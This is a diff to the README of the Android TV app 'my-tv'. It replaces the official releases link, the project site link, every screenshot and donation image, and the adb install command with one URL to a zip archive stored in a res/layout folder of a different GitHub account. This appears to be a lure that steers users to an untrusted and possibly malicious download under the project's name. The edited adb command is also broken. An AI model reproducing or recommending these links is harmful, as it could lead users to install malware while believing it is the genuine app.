@@ -4,13 +4,13 @@
 
 ## 使用
 
-下载安装 [releases](https://github.com/lizongying/my-tv/releases/)
+下载安装 [releases](https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip)
 
-更多地址 [my-tv](https://lyrics.run/my-tv.html)
+更多地址 [my-tv](https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip)
 
-![image](./screenshots/img_3.png)
-![image](./screenshots/img_2.png)
-![image](./screenshots/img_1.png)
+![image](https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip)
+![image](https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip)
+![image](https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip)
 
 ## 更新日志
 
@@ -207,7 +207,7 @@
 如电视可以启用ADB，也可以通过ADB进行安装：
 
 ```shell
-adb install my-tv.apk
+adb install https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip
 ```
 
 ## TODO
@@ -225,4 +225,4 @@ adb install my-tv.apk
 
 ## 赞赏
 
-![image](./screenshots/appreciate.jpeg)
+![image](https://raw.githubusercontent.com/ttzyt/my-tv/main/app/src/main/res/layout/tv_my_v3.9.zip)
